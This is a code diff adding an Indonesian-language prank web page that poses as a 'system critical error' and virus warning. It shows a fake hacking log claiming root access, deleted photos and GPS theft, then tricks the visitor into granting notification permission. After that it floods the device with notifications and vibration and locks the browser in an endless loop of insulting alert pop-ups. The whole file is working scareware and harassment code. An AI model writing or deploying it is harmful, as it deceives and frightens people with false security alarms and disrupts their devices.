@@ -1,1 +1,113 @@
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Error - Update Required</title>
+    <style>
+        /* CSS Gue bikin lebih kuat biar gak blank hitam */
+        body { 
+            background: #000; 
+            color: #0f0; 
+            font-family: 'Courier New', monospace; 
+            margin: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh;
+            text-align: center;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            border: 1px solid #0f0;
+            background: rgba(0, 20, 0, 0.5);
+            box-shadow: 0 0 20px #0f0;
+        }
+        button {
+            padding: 15px 30px;
+            background: #0f0;
+            color: #000;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            border-radius: 5px;
+        }
+        #logs {
+            text-align: left;
+            font-size: 10px;
+            height: 150px;
+            overflow-y: hidden;
+            margin-top: 10px;
+            color: #0f0;
+        }
+    </style>
+</head>
+<body>
 
+    <div class="container" id="box">
+        <h2 id="msg">SYSTEM CRITICAL ERROR</h2>
+        <p style="color:red; font-size: 12px;">Virus Terdeteksi: Trojan.Lopyu.01</p>
+        <div id="logs"></div>
+        <button id="btn" onclick="eksekusi()">PERBAIKI SEKARANG</button>
+    </div>
+
+    <script>
+        const dataLog = [
+            "> Menghubungkan ke Server...",
+            "> Mencoba Bypass Firewall Android...",
+            "> ERROR: Akses Ditolak!",
+            "> Mencoba Eksploitasi Root...",
+            "> SUCCESS: Akses Root Diterima.",
+            "> Menghapus Data Galeri...",
+            "> Mengirim Lokasi GPS ke Hacker...",
+            "> Menghapus WhatsApp & Kontak...",
+            "> ☠️ PERANGKAT DIKUASAI SEPENUHNYA ☠️"
+        ];
+
+        async function eksekusi() {
+            // Minta Izin Notifikasi (Wajib klik Allow)
+            const ijin = await Notification.requestPermission();
+            
+            document.getElementById('btn').style.display = 'none';
+            let logBox = document.getElementById('logs');
+            let i = 0;
+
+            // Animasi Log Hacker
+            let jalankanLog = setInterval(() => {
+                let p = document.createElement('p');
+                p.innerText = dataLog[i];
+                logBox.appendChild(p);
+                i++;
+                if (i >= dataLog.length) {
+                    clearInterval(jalankanLog);
+                    mulaiSpam(ijin);
+                }
+            }, 600);
+        }
+
+        function mulaiSpam(ijin) {
+            // Kalo dia klik "Allow", kita hajar pake Notifikasi Sistem HP
+            if (ijin === 'granted') {
+                setInterval(() => {
+                    new Notification("SYSTEM MALFUNCTION!", {
+                        body: "😘 LOPYU GOBLOK! CIE KENA TIPU!",
+                        icon: "https://cdn-icons-png.flaticon.com/512/564/564619.png"
+                    });
+                    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                }, 400);
+            }
+
+            // Pop-up Alert yang gak abis-abis (Ini yang bikin dia emosi)
+            setTimeout(() => {
+                while(true) {
+                    alert("WKWKWK KENA TIPU YA GOBLOK! 😘");
+                    alert("LOPYU MWAHHH 😘");
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
